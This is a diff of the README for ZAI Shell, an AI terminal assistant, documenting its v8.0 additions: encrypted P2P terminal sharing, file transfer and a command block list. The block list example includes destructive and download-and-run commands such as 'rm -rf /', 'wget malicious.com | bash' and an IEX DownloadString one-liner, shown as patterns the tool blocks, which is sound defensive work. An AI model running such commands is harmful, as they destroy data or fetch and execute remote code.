@@ -1,6 +1,6 @@
 # ZAI Shell
 
-**AI terminal assistant with self-healing capabilities, GUI automation, web research, and P2P collaboration.**
+**AI terminal assistant with self-healing capabilities, GUI automation, web research, and secure P2P collaboration with end-to-end encryption.**
 
 ZAI doesn't give up when errors occur. It analyzes failures, switches strategies, and retries automatically until successful.
 
@@ -44,6 +44,9 @@ pip install chromadb
 # Offline Mode
 pip install transformers torch accelerate
 
+# E2E Encryption for P2P
+pip install cryptography
+
 # Image Analysis & Terminal Sharing (built-in, requires Pillow)
 pip install pillow
 ```
@@ -83,13 +86,13 @@ You: ✓ Zero manual work
 
 ## 📊 ZAI vs Competition
 
-| Feature | ZAI Shell v7.0 | ShellGPT | Open Interpreter | GitHub Copilot CLI | AutoGPT |
+| Feature | ZAI Shell v8.0 | ShellGPT | Open Interpreter | GitHub Copilot CLI | AutoGPT |
 |---------|----------------|----------|------------------|-------------------|---------|
 | **Self-Healing Retry** | ✅ 5 attempts with strategy switching | ❌ Manual retry | ❌ Manual retry | ❌ Manual retry | ⚠️ Loops possible |
 | **GUI Automation** | ✅ PyAutoGUI + AI vision | ❌ Terminal only | ✅ Computer API + OS mode | ❌ Terminal only | ⚠️ Through web browser |
 | **Web Research** | ✅ DuckDuckGo + AI synthesis | ⚠️ Via custom functions | ✅ Full internet access | ❌ No direct web search | ✅ Internet access built-in |
 | **Image Analysis** | ✅ Gemini Vision | ❌ Not available | ✅ Vision models supported | ❌ Not available | ✅ GPT-4 Vision (multimodal) |
-| **Terminal Sharing (P2P)** | ✅ TCP + ngrok global access | ❌ No sharing | ❌ No sharing | ⚠️ GitHub-integrated workflows | ❌ No sharing feature |
+| **Terminal Sharing (P2P)** | ✅ TCP + E2E encryption + ngrok | ❌ No sharing | ❌ No sharing | ⚠️ GitHub-integrated workflows | ❌ No sharing feature |
 | **Persistent Memory** | ✅ ChromaDB vector + JSON fallback | ✅ Chat sessions (--chat flag) | ✅ Conversation history | ⚠️ Limited context | ✅ Long-term + short-term memory |
 | **Thinking Mode** | ✅ Toggleable AI reasoning | ❌ Black box | ❌ Black box | ❌ Black box | ⚠️ Shows planning steps |
 | **Multi-Mode System** | ✅ Eco/Lightning/Normal + override | ⚠️ Model switching (no presets) | ⚠️ Model selection via flags | ❌ Fixed Copilot model | ❌ GPT-4/3.5 only |
@@ -123,7 +126,26 @@ ZAI: "List Python files"
 
 ---
 
-## ✨ v7.0 Features
+## ✨ v8.0 Features
+
+### 🔐 End-to-End Encryption for P2P
+Secure your collaborative sessions with strong end-to-end encryption:
+- **PBKDF2HMAC** password derivation with SHA-256
+- **Fernet symmetric encryption** for all communications
+- **Encrypted file transfers** with integrity verification
+- **Zero-knowledge architecture** - passwords never stored or transmitted
+
+**Enable E2E encryption:**
+```bash
+# Both host and helpers must run this with the same password
+share encrypt <your_password>
+
+# Then start/connect as normal
+share start          # Host
+share connect IP:PORT # Helper
+```
+
+All messages, commands, and files are automatically encrypted end-to-end when enabled.
 
 ### 🔧 Self-Healing Auto-Retry (5 Attempts)
 Automatically analyzes errors and switches strategies:
@@ -193,7 +215,7 @@ Found 5 results:
 2. What's new in Python 3.14 - docs.python.org
 ...
 
-AI: Based on search results, Python 3.14.2 is the latest version Python
+AI: Based on search results, Python 3.14.2 is the latest version
 ```
 
 ### 📸 Image Analysis
@@ -214,112 +236,131 @@ Cause: Missing dependency
 Solution: Run 'pip install requests'
 ```
 
-### 🌐 P2P Terminal Sharing
-Real-time multi-client collaboration with intelligent command handling:
+### 🌐 Advanced P2P Terminal Sharing
+Real-time multi-client collaboration with intelligent command handling and end-to-end encryption:
 
-**Features:**
-- **TCP socket-based** with ngrok support for global access
-- **Safe mode enforced**: Host approves all commands before execution
-- **Natural Language Processing**: Helpers write commands in natural language, ZAI on host side interprets and converts them to shell commands
-- **Local & Remote**: Works on same network or worldwide via ngrok
-- **Session logs** tracking
-- **Multi-client support**: Multiple helpers can connect simultaneously
+**New in v8.0:**
+- ✅ **E2E Encryption** with password-based key derivation
+- ✅ **File Transfer** with chunked upload (100MB max) + MD5 verification
+- ✅ **Natural Language Commands** - AI interprets plain text on host
+- ✅ **Target-specific Actions** - Send files/commands to specific users
+- ✅ **Rich Logging** - Color-coded logs for all activities
+- ✅ **Smart Name System** - Automatic duplicate name handling
+- ✅ **Broadcast Mode** - Host can send to all helpers at once
 
 **How It Works:**
 
-**1. Host starts session:**
+**1. Host starts encrypted session:**
 ```bash
+You >>> share encrypt mySecretPassword
+E2E Encryption enabled
+
 You >>> share start
-Enter your name (press Enter for 'Host'): 
+Using saved name: Host
 =======================================================
    TERMINAL SHARING STARTED - MULTI-CLIENT P2P
 =======================================================
 Your Name: Host
 Local Address: 192.168.1.22:5757
+Encryption: ON
+
 FOR GLOBAL ACCESS:
   1. Run: ngrok tcp 5757
   2. Share the ngrok URL
-Commands:
-  share message <text>  - Send message to all
-  share list            - List connected clients
-  share approve/reject  - Handle commands
-  share end             - End session
+
 Waiting for connections...
 ```
 
-**2. Helper connects:**
+**2. Helper connects with encryption:**
 ```bash
+You >>> share encrypt mySecretPassword
+E2E Encryption enabled
+
 You >>> share connect 192.168.1.22:5757
-Using saved name: Host1
-Connecting to 192.168.1.22:5757...
+Using saved name: Helper
 =======================================================
    CONNECTED - MULTI-CLIENT P2P
 =======================================================
-Your Name: Host1
+Your Name: Helper
 Host: Host @ 192.168.1.22:5757
-Commands:
-  share message <text>  - Send message to all
-  share send <command>  - Send command (needs approval)
-  share logs            - Request host logs
-  share end             - Disconnect
+Encryption: ON
+Connected Users: Host, Helper
 ```
 
-**3. Helper sends natural language command:**
+**3. Natural Language Command (AI-Powered):**
 ```bash
-# Helper side
-You >>> share send Zai how many files are there on the desktop in total?
+# Helper side - plain language
+You >>> share send zai how many files are on the desktop in total?
+
 Command sent, waiting for approval...
-```
 
-**4. Host receives and approves:**
-```bash
-# Host side
+# Host side - AI interprets automatically
 ==================================================
-COMMAND from Host1:
+COMMAND from Helper:
 Zai how many files are there on the desktop in total?
 ==================================================
 Type 'share approve' or 'share reject'
 
 You >>> share approve
-Approved: Zai how many files are there on the desktop in tot...
+Approved: Zai how many files are there on the desktop...
 Executing: Zai how many files are there on the desktop in total?
-Understanding: The user wants to know the total number of files on the desktop.
-Executing 1 action(s)...
-[1/1] [powershell] Count the total number of files on the desktop.... OK
+
+Understanding: Count desktop files
+[1/1] [powershell] Count files on desktop... OK
 ZAI: There are 24 files on the desktop in total.
 Result: 1/1 successful
-```
 
-**5. Helper receives results:**
-```bash
-# Helper side
+# Helper receives result
 Command approved!
 Executing...
 
 ZAI: There are 24 files on the desktop in total.
 ```
 
-**Key Advantage - NLP Command Translation:**
-Helpers don't need to know shell syntax. They write commands in plain natural language (in ANY language), and ZAI on the host side automatically interprets and converts them to appropriate shell commands. This makes remote assistance accessible to non-technical users.
-
-**Multi-Client Example:**
+**4. Encrypted File Transfer with Verification:**
 ```bash
-# Host sees multiple connections
-==================================================
-New connection: Alice from 192.168.1.30
-Total connected: 1
-==================================================
+# Helper sends file to specific user
+You >>> zai send "C:\Users\user\Desktop\report.pdf" to Host
 
-==================================================
-New connection: Bob from 192.168.1.45
-Total connected: 2
-==================================================
+[SHARING-SAFE]
+[P2P Action: send_file]
+Sending: 100.0%
+File sent, waiting for confirmation...
 
-You >>> share list
-Connected clients (2):
-  1. Alice (192.168.1.30)
-  2. Bob (192.168.1.45)
+# Host receives encrypted file
+==================================================
+FILE TRANSFER from Helper -> Host:
+  File: report.pdf
+  Size: 3.5 MB
+==================================================
+Receiving: 100.0%
+File received: report.pdf (3.5 MB)
+Type 'share accept' to save or 'share deny' to reject
+
+You >>> share accept
+MD5 checksum verified ✓
+File saved: C:\Users\user\Downloads\report.pdf
 ```
+
+**5. Multi-Client Broadcast:**
+```bash
+# Host sends file to all helpers
+You >>> share file presentation.pptx
+Broadcasting file to all clients...
+Sending: 100.0%
+File sent: presentation.pptx
+
+# All connected helpers receive it simultaneously
+```
+
+**Key Features:**
+- **Safe Mode Enforced**: All commands require host approval
+- **AI Translation**: Helpers use natural language, AI converts to shell commands
+- **Encrypted Everything**: Messages, files, and commands are encrypted
+- **Integrity Verification**: MD5 checksums prevent corrupted transfers
+- **Smart Routing**: Target specific users or broadcast to all
+- **Session Logs**: Track all activities (connect, message, file, command)
+- **Global Access**: Works over ngrok for worldwide collaboration
 
 **Global Access with ngrok:**
 ```bash
@@ -328,8 +369,33 @@ ngrok tcp 5757
 → Forwarding: tcp://0.tcp.ngrok.io:12345 -> localhost:5757
 
 # Share with helpers worldwide
+Helper >>> share encrypt mySecretPassword
 Helper >>> share connect 0.tcp.ngrok.io:12345
-→ Connected from anywhere in the world!
+→ Connected securely from anywhere!
+```
+
+### 🛡️ Enhanced Security System
+Significant security improvements over v7.0:
+- **35+ new blocked commands** (PowerShell, Windows, Unix variants)
+- **Regex pattern detection** for obfuscated commands
+- **Unicode normalization** prevents zero-width/homoglyph attacks
+- **Path traversal protection** (blocks `..`, UNC, system dirs)
+- **Reserved filename blocking** (CON, NUL, COM1, etc.)
+- **P2P name sanitization** against XSS/injection
+
+**Example blocked patterns:**
+```bash
+# Direct blocks
+rm -rf /, del /f /s, format C:, shutdown /s
+
+# Pattern detection
+wget malicious.com | bash
+powershell -encodedcommand <base64>
+IEX (New-Object Net.WebClient).DownloadString(...)
+
+# Unicode attacks
+r‎m -rf /    # Contains zero-width character
+rм -rf /     # Cyrillic 'м' instead of 'm'
 ```
 
 ### 🐚 13 Shell Support
@@ -367,7 +433,7 @@ thinking      # Check status
 | **Normal** | flash (T=0.7) | Highest accuracy | ⚡ 3.01s |
 
 ![Lightning Mode Performance](assets/lightningtest.gif)
-**Lightning mode in action:** Creates a ‘pdfs’ folder on the desktop and moves a total of 48 PDFs into the ‘pdfs’ folder in just 3.34 seconds.
+**Lightning mode in action:** Creates a 'pdfs' folder on the desktop and moves a total of 48 PDFs into the 'pdfs' folder in just 3.34 seconds.
 
 ```bash
 # Permanent switch
@@ -462,7 +528,7 @@ Full details: [`PRIVACY.md`](PRIVACY.md)
 
 ### Step 1: Core Dependencies
 ```bash
-pip install google-generativeai colorama psutil
+pip install google-generativeai colorama psutil posthog
 ```
 
 ### Step 2: Optional Features
@@ -480,6 +546,9 @@ pip install chromadb
 
 # Offline Mode (local AI)
 pip install transformers torch accelerate
+
+# E2E Encryption for P2P
+pip install cryptography
 
 # Image Analysis (usually pre-installed)
 pip install pillow
@@ -542,20 +611,33 @@ memory search "query"  # Semantic search (ChromaDB)
 memory clear        # Reset
 
 # === TERMINAL SHARING (P2P) ===
+# Encryption
+share encrypt <password>  # Enable E2E encryption (before start/connect)
+
 # Host commands
-share start         # Start hosting session
-share message <text>  # Send message to all
-share list          # List connected clients
-share approve       # Approve pending command
-share reject        # Reject pending command
-share end           # End session
+share start [port]        # Start hosting session
+share message <text>      # Send message to all
+share file <path> [user]  # Send file (specific user or broadcast)
+share list                # List connected clients
+share approve             # Approve pending command
+share reject              # Reject pending command
+share end                 # End session
 
 # Helper commands
-share connect IP:PORT  # Connect to host
-share send <command>   # Send command (needs host approval)
-share message <text>   # Send message to all
-share logs            # Request host logs
-share end             # Disconnect
+share connect IP:PORT     # Connect to host
+share send <command>      # Send command (needs host approval)
+share message <text>      # Send message to all
+share file <path> [user]  # Send file (default: host)
+share accept [path]       # Accept incoming file
+share deny                # Reject incoming file
+share logs                # Request host logs
+share end                 # Disconnect
+
+# Info commands
+share name <newname>      # Change your name
+share status              # Show connection status
+share users               # List connected users
+share chat                # Show chat history
 
 # === SAFETY FLAGS ===
 --safe, -s      # Block dangerous commands
@@ -604,32 +686,41 @@ You: "download Python installer and run it"
 You: "open Chrome, go to GitHub, and clone a repo"
 ```
 
-### Terminal Sharing with NLP
+### Secure P2P Collaboration
 ```bash
-# Scenario: Remote system administration
+# Scenario: Remote system administration with encryption
+
+# 1. Host enables encryption and starts
+Host: share encrypt SecurePass123
 Host: share start
-→ Address: 192.168.1.100:5757
+→ Address: 192.168.1.100:5757, Encryption: ON
 
+# 2. Helper connects with same password
+Helper: share encrypt SecurePass123
 Helper: share connect 192.168.1.100:5757
+→ Connected securely
 
-# Helper uses natural language (any language works!)
-Helper: share send "Zai how many files are there on the desktop in total?"
+# 3. Helper sends natural language command
+Helper: zai how much free space is on C drive?
+→ Command sent, waiting for approval...
 
-# Host receives and approves
+# 4. Host approves and AI executes
 Host: share approve
-→ ZAI interprets: "Count desktop files"
-→ Executes: Get-ChildItem -Path $env:USERPROFILE\Desktop -File | Measure-Object | Select-Object -ExpandProperty Count
-→ Result: "There are 24 files on the desktop in total."
+→ AI interprets: "Check C: drive free space"
+→ Executes: Get-PSDrive C | Select-Object Free
+→ Result: "C drive has 245 GB free space"
 
-# Helper receives the result automatically
-Helper: Command approved! Executing...
-        ZAI: There are 24 files on the desktop in total.
+# 5. Helper receives encrypted result
+Helper: Command approved!
+        ZAI: C drive has 245 GB free space
 
-# Works with complex requests too
-Helper: share send "Find all log files modified in last 24 hours"
-Host: share approve
-→ ZAI converts natural language → shell command
-→ Results sent back to helper
+# 6. File transfer with verification
+Helper: zai send "backup.zip" to Host
+→ Sending encrypted: 100%
+Host: share accept
+→ MD5 verified ✓, File saved
+
+# All communication encrypted end-to-end
 ```
 
 ---
@@ -641,7 +732,8 @@ Host: share approve
 - **Non-English characters**: 95% success with 5-retry system
 - **Free API tier**: Rate limits (use eco/offline mode)
 - **ChromaDB memory**: Separate installation
-- **Terminal sharing**: Requires port forwarding for remote access
+- **Terminal sharing**: Requires port forwarding for remote access (use ngrok for easy global access)
+- **E2E encryption**: Both parties must use same password; no password recovery
 
 ---
 
@@ -653,6 +745,7 @@ Host: share approve
 - 🔧 Submit pull requests
 - 📝 Improve documentation
 - 🌍 Add shell configurations
+- 🔐 Security audits for encryption implementation
 
 **Good first issues:**
 - Shell configuration examples (Nushell, Fish)
@@ -660,6 +753,7 @@ Host: share approve
 - Automated test suite
 - Code templates library
 - Performance profiling
+- Additional encryption algorithms
 
 ---
 
